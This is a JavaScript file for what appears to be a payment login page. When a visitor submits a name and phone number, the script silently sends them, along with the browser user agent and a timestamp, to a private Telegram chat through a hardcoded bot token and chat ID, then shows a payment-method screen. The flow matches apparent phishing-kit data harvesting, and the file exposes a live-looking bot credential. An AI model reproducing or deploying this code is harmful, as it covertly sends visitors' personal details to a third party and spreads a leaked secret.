document.addEventListener('DOMContentLoaded', function() {
    const loginContainer = document.getElementById('loginContainer');
    const paymentContainer = document.getElementById('paymentContainer');
    const loginBtn = document.getElementById('loginBtn');
    const backBtn = document.getElementById('backBtn');
    const nameInput = document.getElementById('name');
    const phoneInput = document.getElementById('nope');
    const userName = document.getElementById('userName');
    const paymentMethods = document.querySelectorAll('.payment-method');
    const paymentDetails = document.querySelectorAll('.payment-details');

    // Function to send Telegram notification with better error handling
    const sendTelegramNotification = async (name, phone) => {
        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk'; // Replace with your actual bot token
        const chatId = '7411016617'; // Replace with your actual chat ID
        
        const message = `🔔 *NEW PAYMENT LOGIN* 🔔\n\n` +
                       `👤 *Name*: ${name}\n` +
                       `📱 *Phone*: ${phone}\n` +
                       `🕒 *Time*: ${new Date().toLocaleString()}\n` +
                       `🌐 *IP*: ${window.location.hostname}\n` +
                       `💻 *Device*: ${navigator.userAgent}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error(`Telegram API error: ${response.status}`);
            }

            const data = await response.json();
            console.log('Telegram notification sent successfully:', data);
        } catch (error) {
            console.error('Error sending Telegram notification:', error);
            // You can add additional error handling here if needed
        }
    };

    // Login Handler
    loginBtn.addEventListener('click', async function() {
        const name = nameInput.value.trim();
        const phone = phoneInput.value.trim();
        
        if (name === '') {
            alert('Please enter your name');
            return;
        }
        
        if (phone === '') {
            alert('Please enter your phone number');
            return;
        }
        
        userName.textContent = name;
        loginContainer.style.display = 'none';
        paymentContainer.style.display = 'block';
        
        // Send Telegram notification with error handling
        try {
            await sendTelegramNotification(name, phone);
        } catch (error) {
            console.error('Error during login:', error);
            // Notification still works even if Telegram fails
        }
        
        // Animation
        paymentContainer.style.animation = 'fadeIn 0.5s ease';
    });

    // Back Button Handler
    backBtn.addEventListener('click', function() {
        paymentContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        nameInput.value = '';
        phoneInput.value = '';
        
        // Reset payment method selection
        paymentMethods.forEach(method => {
            method.classList.remove('active');
        });
        
        paymentDetails.forEach(detail => {
            detail.style.display = 'none';
        });
    });

    // Payment Method Selection
    paymentMethods.forEach(method => {
        method.addEventListener('click', function() {
            // Remove active class from all methods
            paymentMethods.forEach(m => {
                m.classList.remove('active');
            });
            
            // Hide all payment details
            paymentDetails.forEach(detail => {
                detail.style.display = 'none';
            });
            
            // Add active class to selected method
            this.classList.add('active');
            
            // Show corresponding payment details
            const methodType = this.getAttribute('data-method');
            document.getElementById(`${methodType}Details`).style.display = 'block';
        });
    });

    // Auto-select first payment method
    if (paymentMethods.length > 0) {
        paymentMethods[0].click();
    }
});
